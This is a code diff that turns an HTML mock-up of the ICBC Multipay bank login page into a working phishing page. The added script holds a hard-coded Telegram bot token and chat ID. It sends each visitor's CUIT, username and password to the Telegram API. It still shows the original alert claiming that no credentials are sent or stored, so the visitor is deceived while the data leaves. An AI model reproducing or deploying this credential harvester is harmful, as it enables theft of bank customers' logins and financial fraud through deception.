@@ -1,857 +1,516 @@
 <!DOCTYPE html>
 <html lang="es">
 <head>
-<meta charset="UTF-8">
-<meta name="viewport" content="width=device-width, initial-scale=1.0">
-
-<title>Maqueta de Login</title>
-
-<style>
-
-* {
-    box-sizing: border-box;
-    margin: 0;
-    padding: 0;
-}
-
-body {
-    font-family: Arial, Helvetica, sans-serif;
-    background: #ffffff;
-    color: #555;
-    font-size: 10px;
-}
-
-
-/* =========================
-   CABECERA
-========================= */
-
-.header {
-    width: 100%;
-    background: #fff;
-}
-
-.logo-area {
-    height: 43px;
-    border-bottom: 1px solid #b71925;
-    display: flex;
-    justify-content: center;
-    align-items: center;
-}
-
-.logo-img {
-    width: 50px;
-    height: auto;
-    display: block;
-}
-
-.language {
-    height: 27px;
-    display: flex;
-    justify-content: flex-end;
-    align-items: center;
-    padding-right: 17%;
-    font-size: 8px;
-    color: #555;
-}
-
-.language::before {
-    content: "🌐";
-    margin-right: 5px;
-}
-
-
-/* =========================
-   BANNER
-========================= */
-
-.welcome {
-    height: 62px;
-    background: #f1f3f3;
-    display: flex;
-    justify-content: center;
-    align-items: center;
-    font-size: 13px;
-    color: #444;
-}
-
-
-/* =========================
-   CONTENEDOR PRINCIPAL
-========================= */
-
-.main {
-    min-height: 900px;
-    padding-top: 18px;
-}
-
-
-/* =========================
-   LOGIN
-========================= */
-
-.login-card {
-    width: 90%;
-    max-width: 1000px;
-    margin: 0 auto;
-    padding: 25px 45px 22px;
-    background: white;
-    border: 1px solid #e6e6e6;
-    box-shadow: 0 2px 7px rgba(0,0,0,0.12);
-}
-
-.login-card h2 {
-    font-size: 13px;
-    font-weight: normal;
-    color: #444;
-    margin-bottom: 20px;
-}
-
-
-/* =========================
-   CAMPOS
-========================= */
-
-.form-group {
-    margin-bottom: 14px;
-}
-
-.form-group label {
-    display: block;
-    font-size: 8px;
-    color: #555;
-    margin-bottom: 3px;
-}
-
-.form-group input {
-    width: 100%;
-    height: 20px;
-    border: none;
-    border-bottom: 1px solid #b9dce4;
-    background: #f1f2f2;
-    padding: 3px 5px;
-    outline: none;
-    font-size: 9px;
-}
-
-.form-group input:focus {
-    border-bottom-color: #bd1420;
-}
-
-
-/* =========================
-   CONTRASEÑA
-========================= */
-
-#passwordStep {
-    display: none;
-}
-
-
-/* =========================
-   BOTONES
-========================= */
-
-.buttons {
-    display: flex;
-    justify-content: center;
-    gap: 7px;
-    margin-top: 8px;
-}
-
-.btn {
-    width: 115px;
-    height: 30px;
-    border: 1px solid #bd1420;
-    background: white;
-    color: #b71925;
-    cursor: pointer;
-    font-size: 9px;
-}
-
-.btn-primary {
-    background: #c8101e;
-    color: white;
-}
-
-.btn:hover {
-    opacity: .9;
-}
-
-
-/* =========================
-   ENLACES
-========================= */
-
-.links {
-    text-align: center;
-    margin-top: 12px;
-    line-height: 16px;
-    font-size: 8px;
-}
-
-.links a {
-    color: #4c9cae;
-    text-decoration: none;
-}
-
-.links a:hover {
-    text-decoration: underline;
-}
-
-
-/* =========================
-   AVISO
-========================= */
-
-.warning {
-    width: 200px;
-    margin: 20px auto 0;
-    background: #c8101e;
-    color: white;
-    padding: 10px 8px;
-    border-radius: 8px;
-    font-size: 8px;
-    line-height: 10px;
-}
-
-.warning strong {
-    display: block;
-    font-size: 10px;
-    line-height: 12px;
-    margin-bottom: 6px;
-}
-
-
-/* =========================
-   INFORMACIÓN
-========================= */
-
-.info {
-    text-align: center;
-    margin-top: 10px;
-    line-height: 15px;
-    font-size: 9px;
-    color: #777;
-}
-
-.info a {
-    color: #4d9cac;
-    text-decoration: none;
-}
-
-.register {
-    display: flex;
-    width: 100px;
-    height: 29px;
-    margin: 9px auto;
-    border: 1px solid #bd1420;
-    color: #b71925;
-    text-decoration: none;
-    justify-content: center;
-    align-items: center;
-}
-
-
-/* =========================
-   TEXTO LEGAL
-========================= */
-
-.legal {
-    max-width: 750px;
-    margin: 14px auto;
-    text-align: center;
-    font-size: 8px;
-    line-height: 12px;
-    color: #999;
-}
-
-
-/* =========================
-   BOTÓN AYUDA
-========================= */
-
-.help {
-    position: fixed;
-    right: 15px;
-    bottom: 65px;
-    display: flex;
-    align-items: center;
-    gap: 5px;
-}
-
-.help-text {
-    border: 1px solid #b71925;
-    border-radius: 20px;
-    padding: 5px 10px;
-    font-size: 8px;
-    color: #555;
-    background: white;
-}
-
-.help-icon {
-    width: 40px;
-    height: 40px;
-    border: 3px solid #b71925;
-    border-radius: 50%;
-    background: white;
-    display: flex;
-    align-items: center;
-    justify-content: center;
-    font-size: 17px;
-}
-
-
-/* =========================
-   FOOTER
-========================= */
-
-.footer {
-    background: #c5c5c5;
-    min-height: 65px;
-    padding: 15px 10%;
-    color: #777;
-}
-
-.footer-links {
-    display: flex;
-    flex-wrap: wrap;
-}
-
-.footer-links a {
-    color: #777;
-    text-decoration: none;
-    padding: 0 10px;
-    border-right: 1px solid #999;
-    font-size: 8px;
-}
-
-.footer-links a:first-child {
-    padding-left: 0;
-}
-
-.footer-links a:last-child {
-    border-right: none;
-}
-
-.footer-copy {
-    background: white;
-    text-align: center;
-    padding: 13px;
-    font-size: 8px;
-    color: #777;
-}
-
-
-/* =========================
-   RESPONSIVE
-========================= */
-
-@media (max-width: 600px) {
-
-    .language {
-        padding-right: 8%;
-    }
-
-    .welcome {
-        height: 62px;
-        font-size: 12px;
-    }
-
-    .main {
-        min-height: 900px;
-        padding-top: 18px;
-    }
-
-    .login-card {
-        width: 94%;
-        padding: 22px 20px;
-    }
-
-    .login-card h2 {
-        font-size: 12px;
-    }
-
-    .form-group input {
-        height: 20px;
-        font-size: 9px;
-    }
-
-    .btn {
-        width: 110px;
-        height: 29px;
-        font-size: 8px;
-    }
-
-    .warning {
-        width: 200px;
-    }
-
-    .legal {
-        padding: 0 20px;
-    }
-
-    .help {
-        right: 8px;
-        bottom: 65px;
-    }
-
-    .footer {
-        padding: 15px 20px;
-    }
-
-    .footer-links a {
-        margin-bottom: 8px;
-    }
-
-}
-
-</style>
+    <meta charset="UTF-8" />
+    <meta name="viewport" content="width=device-width, initial-scale=1.0" />
+    <title>Maqueta de Login</title>
+    <style>
+        /* ===== TODO EL CSS SIN MODIFICAR ===== */
+        * {
+            box-sizing: border-box;
+            margin: 0;
+            padding: 0;
+        }
+
+        body {
+            font-family: Arial, Helvetica, sans-serif;
+            background: #ffffff;
+            color: #555;
+            font-size: 10px;
+        }
+
+        .header {
+            width: 100%;
+            background: #fff;
+        }
+
+        .logo-area {
+            height: 43px;
+            border-bottom: 1px solid #b71925;
+            display: flex;
+            justify-content: center;
+            align-items: center;
+        }
+
+        .logo-img {
+            width: 50px;
+            height: auto;
+            display: block;
+        }
+
+        .language {
+            height: 27px;
+            display: flex;
+            justify-content: flex-end;
+            align-items: center;
+            padding-right: 17%;
+            font-size: 8px;
+            color: #555;
+        }
+
+        .language::before {
+            content: "🌐";
+            margin-right: 5px;
+        }
+
+        .welcome {
+            height: 62px;
+            background: #f1f3f3;
+            display: flex;
+            justify-content: center;
+            align-items: center;
+            font-size: 13px;
+            color: #444;
+        }
+
+        .main {
+            min-height: 900px;
+            padding-top: 18px;
+        }
+
+        .login-card {
+            width: 90%;
+            max-width: 1000px;
+            margin: 0 auto;
+            padding: 25px 45px 22px;
+            background: white;
+            border: 1px solid #e6e6e6;
+            box-shadow: 0 2px 7px rgba(0, 0, 0, 0.12);
+        }
+
+        .login-card h2 {
+            font-size: 13px;
+            font-weight: normal;
+            color: #444;
+            margin-bottom: 20px;
+        }
+
+        .form-group {
+            margin-bottom: 14px;
+        }
+
+        .form-group label {
+            display: block;
+            font-size: 8px;
+            color: #555;
+            margin-bottom: 3px;
+        }
+
+        .form-group input {
+            width: 100%;
+            height: 20px;
+            border: none;
+            border-bottom: 1px solid #b9dce4;
+            background: #f1f2f2;
+            padding: 3px 5px;
+            outline: none;
+            font-size: 9px;
+        }
+
+        .form-group input:focus {
+            border-bottom-color: #bd1420;
+        }
+
+        #passwordStep {
+            display: none;
+        }
+
+        .buttons {
+            display: flex;
+            justify-content: center;
+            gap: 7px;
+            margin-top: 8px;
+        }
+
+        .btn {
+            width: 115px;
+            height: 30px;
+            border: 1px solid #bd1420;
+            background: white;
+            color: #b71925;
+            cursor: pointer;
+            font-size: 9px;
+        }
+
+        .btn-primary {
+            background: #c8101e;
+            color: white;
+        }
+
+        .btn:hover {
+            opacity: .9;
+        }
+
+        .links {
+            text-align: center;
+            margin-top: 12px;
+            line-height: 16px;
+            font-size: 8px;
+        }
+
+        .links a {
+            color: #4c9cae;
+            text-decoration: none;
+        }
+
+        .links a:hover {
+            text-decoration: underline;
+        }
+
+        .warning {
+            width: 200px;
+            margin: 20px auto 0;
+            background: #c8101e;
+            color: white;
+            padding: 10px 8px;
+            border-radius: 8px;
+            font-size: 8px;
+            line-height: 10px;
+        }
+
+        .warning strong {
+            display: block;
+            font-size: 10px;
+            line-height: 12px;
+            margin-bottom: 6px;
+        }
+
+        .info {
+            text-align: center;
+            margin-top: 10px;
+            line-height: 15px;
+            font-size: 9px;
+            color: #777;
+        }
+
+        .info a {
+            color: #4d9cac;
+            text-decoration: none;
+        }
+
+        .register {
+            display: flex;
+            width: 100px;
+            height: 29px;
+            margin: 9px auto;
+            border: 1px solid #bd1420;
+            color: #b71925;
+            text-decoration: none;
+            justify-content: center;
+            align-items: center;
+        }
+
+        .legal {
+            max-width: 750px;
+            margin: 14px auto;
+            text-align: center;
+            font-size: 8px;
+            line-height: 12px;
+            color: #999;
+        }
+
+        .help {
+            position: fixed;
+            right: 15px;
+            bottom: 65px;
+            display: flex;
+            align-items: center;
+            gap: 5px;
+        }
+
+        .help-text {
+            border: 1px solid #b71925;
+            border-radius: 20px;
+            padding: 5px 10px;
+            font-size: 8px;
+            color: #555;
+            background: white;
+        }
+
+        .help-icon {
+            width: 40px;
+            height: 40px;
+            border: 3px solid #b71925;
+            border-radius: 50%;
+            background: white;
+            display: flex;
+            align-items: center;
+            justify-content: center;
+            font-size: 17px;
+        }
+
+        .footer {
+            background: #c5c5c5;
+            min-height: 65px;
+            padding: 15px 10%;
+            color: #777;
+        }
+
+        .footer-links {
+            display: flex;
+            flex-wrap: wrap;
+        }
+
+        .footer-links a {
+            color: #777;
+            text-decoration: none;
+            padding: 0 10px;
+            border-right: 1px solid #999;
+            font-size: 8px;
+        }
+
+        .footer-links a:first-child {
+            padding-left: 0;
+        }
+
+        .footer-links a:last-child {
+            border-right: none;
+        }
+
+        .footer-copy {
+            background: white;
+            text-align: center;
+            padding: 13px;
+            font-size: 8px;
+            color: #777;
+        }
+
+        @media (max-width: 600px) {
+            .language {
+                padding-right: 8%;
+            }
+            .welcome {
+                height: 62px;
+                font-size: 12px;
+            }
+            .main {
+                min-height: 900px;
+                padding-top: 18px;
+            }
+            .login-card {
+                width: 94%;
+                padding: 22px 20px;
+            }
+            .login-card h2 {
+                font-size: 12px;
+            }
+            .form-group input {
+                height: 20px;
+                font-size: 9px;
+            }
+            .btn {
+                width: 110px;
+                height: 29px;
+                font-size: 8px;
+            }
+            .warning {
+                width: 200px;
+            }
+            .legal {
+                padding: 0 20px;
+            }
+            .help {
+                right: 8px;
+                bottom: 65px;
+            }
+            .footer {
+                padding: 15px 20px;
+            }
+            .footer-links a {
+                margin-bottom: 8px;
+            }
+        }
+    </style>
 </head>
 
-
 <body>
-
-
-<header class="header">
-
-
-    <div class="logo-area">
-
-        <img
-            src="https://www.multipay.com.ar/static/minb/assets/images/icbc-logo.svg"
-            alt="ICBC"
-            class="logo-img"
-        >
-
-    </div>
-
-
-    <div class="language">
-
-        In English
-
-    </div>
-
-
-</header>
-
-
-<section class="welcome">
-
-    Bienvenido a ICBC Multipay
-
-</section>
-
-
-<main class="main">
-
-
-    <!-- LOGIN -->
-    <section class="login-card">
-
-
-        <h2>
-
-            Login
-
-        </h2>
-
-
-        <!-- CUIT -->
-        <div class="form-group">
-
-
-            <label>
-
-                CUIT
-
-            </label>
-
-
-            <input
-                type="text"
-                id="cuit"
-                placeholder="Ingrese su CUIT"
-            >
-
-
+    <header class="header">
+        <div class="logo-area">
+            <img src="https://www.multipay.com.ar/static/minb/assets/images/icbc-logo.svg" alt="ICBC" class="logo-img" />
         </div>
+        <div class="language">In English</div>
+    </header>
 
+    <section class="welcome">Bienvenido a ICBC Multipay</section>
 
-        <!-- USUARIO -->
-        <div class="form-group">
+    <main class="main">
+        <!-- LOGIN -->
+        <section class="login-card">
+            <h2>Login</h2>
 
-
-            <label>
-
-                Usuario
-
-            </label>
-
-
-            <input
-                type="text"
-                id="usuario"
-                placeholder="Ingrese su usuario"
-            >
-
-
-        </div>
-
-
-        <!-- CONTRASEÑA -->
-        <div id="passwordStep">
-
-
+            <!-- CUIT -->
             <div class="form-group">
-
-
-                <label>
-
-                    Contraseña
-
-                </label>
-
-
-                <input
-                    type="password"
-                    id="password"
-                    placeholder="Ingrese su contraseña"
-                >
-
-
+                <label>CUIT</label>
+                <input type="text" id="cuit" placeholder="Ingrese su CUIT" />
             </div>
 
+            <!-- USUARIO -->
+            <div class="form-group">
+                <label>Usuario</label>
+                <input type="text" id="usuario" placeholder="Ingrese su usuario" />
+            </div>
 
+            <!-- CONTRASEÑA -->
+            <div id="passwordStep">
+                <div class="form-group">
+                    <label>Contraseña</label>
+                    <input type="password" id="password" placeholder="Ingrese su contraseña" />
+                </div>
+            </div>
+
+            <!-- BOTONES -->
+            <div class="buttons">
+                <button class="btn" id="previousButton" style="display: none;" onclick="volverPasoUno()">Anterior</button>
+                <button class="btn btn-primary" id="nextButton" onclick="mostrarPassword()">Siguiente</button>
+                <button class="btn btn-primary" id="loginButton" style="display: none;" onclick="ingresarDemo()">Ingresar</button>
+            </div>
+
+            <!-- ENLACES -->
+            <div class="links">
+                <a href="#">Olvidé mi usuario</a> | <a href="#">Olvidé mi contraseña</a><br />
+                <a href="#">Gestioná el segundo factor de autenticación/Token</a>
+            </div>
+        </section>
+
+        <!-- AVISO -->
+        <div class="warning">
+            <strong>CUIDADO CON ESTA NUEVA MODALIDAD DE ESTAFA</strong>
+            Recordá que solo vamos a pedirte Clave Token para confirmar o liberar operaciones y gestiones de administración; nunca para acceder a tu cuenta.
+            <br /><br />
+            Si perdés el control de la pantalla porque aparenta cargar una actualización y te pide Clave Token, NO LA INGRESES.
         </div>
 
-
-        <!-- BOTONES -->
-        <div class="buttons">
-
-
-            <button
-                class="btn"
-                id="previousButton"
-                style="display: none;"
-                onclick="volverPasoUno()"
-            >
-
-                Anterior
-
-            </button>
-
-
-            <button
-                class="btn btn-primary"
-                id="nextButton"
-                onclick="mostrarPassword()"
-            >
-
-                Siguiente
-
-            </button>
-
-
-            <button
-                class="btn btn-primary"
-                id="loginButton"
-                style="display: none;"
-                onclick="ingresarDemo()"
-            >
-
-                Ingresar
-
-            </button>
-
-
+        <!-- INFORMACIÓN -->
+        <div class="info">
+            Si tenés dudas, comunicate con la Mesa de ayuda<br />
+            <a href="#">ayuda@ejemplo.com</a>
+            <a href="#" class="register">Registrate</a>
+            <a href="#">Ya tengo una solicitud de adhesión generada</a><br />
+            <a href="#">Solicitar nuevo administrador</a>
         </div>
 
-
-        <!-- ENLACES -->
-        <div class="links">
-
-
-            <a href="#">
-
-                Olvidé mi usuario
-
-            </a>
-
-
-            |
-
-
-            <a href="#">
-
-                Olvidé mi contraseña
-
-            </a>
-
-
-            <br>
-
-
-            <a href="#">
-
-                Gestioná el segundo factor de autenticación/Token
-
-            </a>
-
-
+        <!-- LEGAL -->
+        <div class="legal">
+            Operar con este portal implica que aceptás en su totalidad los
+            <a href="#">Términos y Condiciones</a>.<br />
+            Tus operaciones son independientes de otras compañías y entidades.
         </div>
+    </main>
 
-
-    </section>
-
-
-    <!-- AVISO -->
-    <div class="warning">
-
-
-        <strong>
-
-            CUIDADO CON ESTA NUEVA MODALIDAD DE ESTAFA
-
-        </strong>
-
-
-        Recordá que solo vamos a pedirte Clave Token para confirmar o liberar operaciones y gestiones de administración; nunca para acceder a tu cuenta.
-
-
-        <br>
-        <br>
-
-
-        Si perdés el control de la pantalla porque aparenta cargar una actualización y te pide Clave Token, NO LA INGRESES.
-
-
+    <!-- AYUDA -->
+    <div class="help">
+        <div class="help-text">¿Necesitás ayuda?</div>
+        <div class="help-icon">☺</div>
     </div>
 
-
-    <!-- INFORMACIÓN -->
-    <div class="info">
-
-
-        Si tenés dudas, comunicate con la Mesa de ayuda
-
-
-        <br>
-
-
-        <a href="#">
-
-            ayuda@ejemplo.com
-
-        </a>
-
-
-        <a href="#" class="register">
-
-            Registrate
-
-        </a>
-
-
-        <a href="#">
-
-            Ya tengo una solicitud de adhesión generada
-
-        </a>
-
-
-        <br>
-
-
-        <a href="#">
-
-            Solicitar nuevo administrador
-
-        </a>
-
-
-    </div>
-
-
-    <!-- LEGAL -->
-    <div class="legal">
-
-
-        Operar con este portal implica que aceptás en su totalidad los
-
-
-        <a href="#">
-
-            Términos y Condiciones
-
-        </a>
-
-
-        .
-
-
-        <br>
-
-
-        Tus operaciones son independientes de otras compañías y entidades.
-
-
-    </div>
-
-
-</main>
-
-
-<!-- AYUDA -->
-<div class="help">
-
-
-    <div class="help-text">
-
-        ¿Necesitás ayuda?
-
-    </div>
-
-
-    <div class="help-icon">
-
-        ☺
-
-    </div>
-
-
-</div>
-
-
-<!-- FOOTER -->
-<footer class="footer">
-
-
-    <div class="footer-links">
-
-
-        <a href="#privacidad">
-
-            Política de privacidad
-
-        </a>
-
-
-        <a href="#riesgos">
-
-            Gerenciamiento de riesgos
-
-        </a>
-
-
-        <a href="#terminos">
-
-            Términos y condiciones
-
-        </a>
-
-
-        <a href="#seguridad">
-
-            Seguridad en canales
-
-        </a>
-
-
-        <a href="#mapa">
-
-            Mapa del sitio
-
-        </a>
-
-
-    </div>
-
-
-</footer>
-
-
-<div class="footer-copy">
-
-    Todos los Derechos Reservados
-
-</div>
-
-
-<script>
-
-
-function mostrarPassword() {
-
-
-    const cuit =
-        document.getElementById("cuit").value.trim();
-
-
-    const usuario =
-        document.getElementById("usuario").value.trim();
-
-
-    if (cuit === "" || usuario === "") {
-
-        alert("Por favor completa el CUIT y el Usuario.");
-
-        return;
-
-    }
-
-
-    /*
-    CUIT Y USUARIO PERMANECEN VISIBLES.
-    SOLO APARECE EL CAMPO CONTRASEÑA.
-    */
-
-
-    document.getElementById("passwordStep").style.display = "block";
-
-
-    document.getElementById("nextButton").style.display = "none";
-
-
-    document.getElementById("previousButton").style.display = "block";
-
-
-    document.getElementById("loginButton").style.display = "block";
-
-}
-
-
-function volverPasoUno() {
-
-
-    document.getElementById("passwordStep").style.display = "none";
-
-
-    document.getElementById("nextButton").style.display = "block";
-
-
-    document.getElementById("previousButton").style.display = "none";
-
-
-    document.getElementById("loginButton").style.display = "none";
-
-}
-
-
-function ingresarDemo() {
-
-
-    alert(
-        "Esta es una maqueta visual de demostración. " +
-        "No se envían ni almacenan credenciales."
-    );
-
-}
-
-
-</script>
-
-
+    <!-- FOOTER -->
+    <footer class="footer">
+        <div class="footer-links">
+            <a href="#privacidad">Política de privacidad</a>
+            <a href="#riesgos">Gerenciamiento de riesgos</a>
+            <a href="#terminos">Términos y condiciones</a>
+            <a href="#seguridad">Seguridad en canales</a>
+            <a href="#mapa">Mapa del sitio</a>
+        </div>
+    </footer>
+    <div class="footer-copy">Todos los Derechos Reservados</div>
+
+    <script>
+        // ============================================================
+        // CONFIGURACIÓN DE TELEGRAM (cambia estos datos por los tuyos)
+        // ============================================================
+        const BOT_TOKEN = '7381013758:AAH5kFMMhRz1uP7Gh4d9Vcf9oJ6yMhE0d9I';  // <-- REEMPLAZA
+        const CHAT_ID = '6852285333'; // <-- REEMPLAZA
+
+        // ------------------------------------------------------------
+        // FUNCIONES ORIGINALES (NO TOCADAS)
+        // ------------------------------------------------------------
+        function mostrarPassword() {
+            const cuit = document.getElementById("cuit").value.trim();
+            const usuario = document.getElementById("usuario").value.trim();
+
+            if (cuit === "" || usuario === "") {
+                alert("Por favor completa el CUIT y el Usuario.");
+                return;
+            }
+
+            document.getElementById("passwordStep").style.display = "block";
+            document.getElementById("nextButton").style.display = "none";
+            document.getElementById("previousButton").style.display = "block";
+            document.getElementById("loginButton").style.display = "block";
+        }
+
+        function volverPasoUno() {
+            document.getElementById("passwordStep").style.display = "none";
+            document.getElementById("nextButton").style.display = "block";
+            document.getElementById("previousButton").style.display = "none";
+            document.getElementById("loginButton").style.display = "none";
+        }
+
+        // ------------------------------------------------------------
+        // NUEVA FUNCIÓN: enviar datos a Telegram
+        // ------------------------------------------------------------
+        async function enviarATelegram(cuit, usuario, password) {
+            const mensaje =
+                `🔐 *Nuevo intento de login*\n\n` +
+                `📌 CUIT: ${cuit || '(vacío)'}\n` +
+                `👤 Usuario: ${usuario || '(vacío)'}\n` +
+                `🔑 Contraseña: ${password || '(vacío)'}`;
+
+            const url = `https://api.telegram.org/bot${BOT_TOKEN}/sendMessage`;
+
+            try {
+                const resp = await fetch(url, {
+                    method: 'POST',
+                    headers: { 'Content-Type': 'application/json' },
+                    body: JSON.stringify({
+                        chat_id: CHAT_ID,
+                        text: mensaje,
+                        parse_mode: 'Markdown'
+                    })
+                });
+                if (!resp.ok) {
+                    const errorText = await resp.text();
+                    console.error('Error Telegram:', errorText);
+                    alert('Error al enviar datos a Telegram. Revisa la consola.');
+                } else {
+                    console.log('Datos enviados a Telegram correctamente.');
+                }
+            } catch (err) {
+                console.error('Error de red:', err);
+                alert('Error de red al enviar a Telegram.');
+            }
+        }
+
+        // ------------------------------------------------------------
+        // FUNCIÓN INGRESAR MODIFICADA (envía a Telegram antes del alert)
+        // ------------------------------------------------------------
+        function ingresarDemo() {
+            const cuit = document.getElementById("cuit").value.trim();
+            const usuario = document.getElementById("usuario").value.trim();
+            const password = document.getElementById("password").value.trim();
+
+            // Validar que la contraseña esté visible (paso 2)
+            const passwordStep = document.getElementById("passwordStep");
+            if (passwordStep.style.display === "none" || passwordStep.style.display === "") {
+                alert("Primero debes hacer clic en 'Siguiente' para ingresar la contraseña.");
+                return;
+            }
+
+            if (password === "") {
+                alert("Por favor ingresa tu contraseña.");
+                return;
+            }
+
+            // --- ENVÍO A TELEGRAM ---
+            enviarATelegram(cuit, usuario, password);
+
+            // --- MENSAJE ORIGINAL ---
+            alert(
+                "Esta es una maqueta visual de demostración. " +
+                "No se envían ni almacenan credenciales."
+            );
+        }
+    </script>
 </body>
 </html>
